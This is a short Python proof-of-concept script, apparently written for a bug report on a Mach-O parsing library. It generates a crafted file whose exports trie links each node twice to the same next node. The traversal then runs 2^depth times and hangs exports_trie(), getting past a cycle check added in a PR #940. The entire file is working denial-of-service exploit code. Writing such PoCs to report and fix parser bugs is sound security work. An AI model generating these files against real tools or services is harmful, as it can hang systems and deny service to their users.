#!/usr/bin/env python3
# object: exports-trie shared-subtree exponential-time DoS (NEW on main, the "shared subtrees" gap
# acknowledged in PR #940). Each node has 2 edges to the SAME next node -> 2^depth root->leaf paths;
# the ancestor cycle-check (added in #940) does not fire (no path revisits an ancestor), so the DFS
# re-traverses shared subtrees exponentially. ~330-byte Mach-O -> hang via exports_trie().
import struct, os, sys
def uleb(n):
    out = bytearray()
    while True:
        b = n & 0x7f; n >>= 7
        out.append(b | 0x80 if n else b)
        if not n: break
    return bytes(out)
L = int(sys.argv[2]) if len(sys.argv) > 2 else 40
off = [i * 8 for i in range(L + 1)]
for _ in range(64):                        # fixed-point offset layout (uleb widths depend on offsets)
    new = [0]
    for k in range(L):
        body = b"\x00\x02" + b"\x00" + uleb(off[k+1]) + b"\x00" + uleb(off[k+1])
        new.append(new[-1] + len(body))
    if new[:L+1] == off[:L+1]: off = new; break
    off = new
trie = bytearray()
for k in range(L):                          # node: term=0, 2 children, both empty-edge -> next node
    trie += b"\x00\x02" + b"\x00" + uleb(off[k+1]) + b"\x00" + uleb(off[k+1])
trie += b"\x00\x00"                          # leaf
hdr = struct.pack("<IiiIIII I", 0xfeedfacf, 0x01000007, 3, 6, 1, 16, 0, 0)  # mach_header_64, ncmds=1
lc  = struct.pack("<IIII", 0x80000033, 16, 48, len(trie))                   # LC_DYLD_EXPORTS_TRIE
open(sys.argv[1] if len(sys.argv) > 1 else "poc.bin", "wb").write(hdr + lc + bytes(trie))
print(f"L={L}, {len(hdr)+len(lc)+len(trie)} bytes, 2^{L} traversals")
